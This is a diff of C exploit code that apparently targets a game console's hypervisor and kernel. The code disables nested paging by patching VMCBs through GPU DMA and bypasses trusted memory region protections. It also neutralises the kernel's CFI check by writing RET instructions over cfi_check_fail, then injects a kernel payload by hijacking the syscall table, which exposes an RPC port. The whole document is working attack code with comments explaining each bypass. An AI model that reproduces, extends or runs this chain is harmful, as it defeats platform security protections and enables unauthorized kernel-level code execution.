@@ -142,31 +142,34 @@ static int discover_kernel_base(struct phys_rw_ctx *ctx)
 }
 
 /*
- * NOP the cfi_check_fail function via MP4 memory write.
+ * NOP the cfi_check_fail function via DMAP write.
  *
- * This is necessary because the kernel uses Control Flow Integrity (CFI)
- * checks that would trap our syscall table hijack. By NOPing the check
- * function, we prevent CFI from blocking our payload execution.
- *
- * We use the MP4 coprocessor to write to kernel text because it has
- * its own DMA path that bypasses x86 page table NX/RO protections.
+ * After VMCB patching disables nested paging, the CPU has direct
+ * access to all physical memory via DMAP. We can write to kernel
+ * text without MP4 or GPU — just kernel_copyin to DMAP + PA.
  */
 static int cfi_bypass(struct phys_rw_ctx *ctx)
 {
     uint64_t cfi_check_fail_pa = ctx->ktext_base_pa + KOFF_CFI_CHECK_FAIL;
+    uint64_t cfi_check_fail_kva = ctx->dmap_base + cfi_check_fail_pa;
     uint32_t nop_sled = 0xC3C3C3C3; /* ret; ret; ret; ret */
 
-    /* Setup SysHub TLB to map the kernel text region */
-    if (mp4_syshub_tlb_setup(ctx, 32, cfi_check_fail_pa) != 0) {
-        printf("[!] Failed to setup SysHub TLB for CFI bypass\n");
+    printf("[*] CFI: Writing RET sled to PA 0x%lx (DMAP VA 0x%lx)\n",
+           cfi_check_fail_pa, cfi_check_fail_kva);
+
+    kernel_copyin(&nop_sled, cfi_check_fail_kva, sizeof(nop_sled));
+
+    /* Verify */
+    uint32_t verify = 0;
+    kernel_copyout(cfi_check_fail_kva, &verify, sizeof(verify));
+    printf("[*] CFI: Verify: 0x%08x (expect 0xC3C3C3C3) %s\n",
+           verify, verify == 0xC3C3C3C3 ? "OK" : "MISMATCH");
+
+    if (verify != 0xC3C3C3C3) {
+        printf("[!] CFI: Write failed — NP still active?\n");
         return -1;
     }
 
-    /* Write NOP/RET over cfi_check_fail via MP4 */
-    uint32_t mp4_va = 0x80000000 + (cfi_check_fail_pa & 0x03FFFFFF);
-    mp4_write32(ctx, mp4_va, nop_sled);
-
-    printf("[*] CFI check_fail patched at PA 0x%lx\n", cfi_check_fail_pa);
     return 0;
 }
 
@@ -202,28 +205,8 @@ int prosperous_run(void)
         return ret;
     }
 
-    /* Phase 1: Initialize DECI5S for A53 communication.
-     *
-     * DECI5S provides read/write access to the A53's entire EL3 address
-     * space WITHOUT custom code execution. We use it to:
-     *   - Configure SYSHUB TLB registers (map HV system PAs)
-     *   - Read/write VMCB data through the TLB-mapped addresses
-     *
-     * This bypasses the I-cache coherency problem entirely — no code
-     * patches, no payload injection, no I-cache flush needed. Pure data
-     * operations through the existing DECI5S firmware handler.
-     */
-    printf("\n[*] Phase 1: DECI5S initialization...\n");
-
-    ret = deci5s_init(&ctx);
-    if (ret != 0) {
-        printf("[!] DECI5S init failed: %d\n", ret);
-        return ret;
-    }
-    printf("[+] DECI5S ready\n");
-
-    /* Phase 2: TMR bypass */
-    printf("\n[*] Phase 2: TMR bypass...\n");
+    /* Phase 1: TMR bypass */
+    printf("\n[*] Phase 1: TMR bypass...\n");
 
     ret = tmr_bypass_init(&ctx);
     if (ret != 0) {
@@ -235,8 +218,8 @@ int prosperous_run(void)
     tmr_restore_tmr20(&ctx);
     printf("[+] TMR 20 restored\n");
 
-    /* Phase 3: Disable HV TMR protections */
-    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");
+    /* Phase 2: Disable HV TMR protections */
+    printf("\n[*] Phase 2: Disabling HV TMR protections...\n");
 
     ret = tmr_disable_hv_regions(&ctx);
     if (ret != 0) {
@@ -246,14 +229,14 @@ int prosperous_run(void)
     }
     printf("[+] HV TMR protections disabled\n");
 
-    /* Phase 4: VMCB patching via DECI5S + SYSHUB TLB
+    /* Phase 3: VMCB patching via GPU SDMA (flatz method)
      *
-     * x86 cannot directly access VMCB memory (NPT blocks it). Instead,
-     * we use DECI5S to configure SYSHUB TLB entries on the A53, then
-     * read/write VMCB data through those entries. No custom A53 code
-     * execution — pure DECI5S register writes.
+     * x86 cannot access VMCB memory (NPT blocks it). Instead, we use
+     * the GPU's SDMA engine to DMA-copy VMCB data to/from accessible
+     * bounce buffers. The GPU goes through IOMMU, bypassing x86 NPT.
+     * TMR bypass above enables GFX source access to HV memory.
      */
-    printf("\n[*] Phase 4: VMCB patching (disabling nested paging)...\n");
+    printf("\n[*] Phase 3: VMCB patching via GPU SDMA...\n");
 
     ret = vmcb_patch_disable_np(&ctx);
     if (ret != 0) {
@@ -263,8 +246,8 @@ int prosperous_run(void)
     }
     printf("[+] Nested paging disabled on all VMCBs\n");
 
-    /* Phase 5: CFI bypass */
-    printf("\n[*] Phase 5: CFI bypass...\n");
+    /* Phase 4: CFI bypass */
+    printf("\n[*] Phase 4: CFI bypass...\n");
 
     ret = cfi_bypass(&ctx);
     if (ret != 0) {
@@ -274,13 +257,13 @@ int prosperous_run(void)
     }
     printf("[+] CFI check_fail patched\n");
 
-    /* Phase 6: Restore TMR protections */
-    printf("\n[*] Phase 6: Restoring TMR protections...\n");
+    /* Phase 5: Restore TMR protections */
+    printf("\n[*] Phase 5: Restoring TMR protections...\n");
     tmr_restore_hv_regions(&ctx);
     printf("[+] TMR protections restored\n");
 
-    /* Phase 7: Kernel payload injection */
-    printf("\n[*] Phase 7: Kernel payload injection...\n");
+    /* Phase 6: Kernel payload injection */
+    printf("\n[*] Phase 6: Kernel payload injection...\n");
     printf("[*] kpayload will be injected via syscall table hijack.\n");
     printf("[*] After injection, connect to port 6670 for RPC access.\n");
 
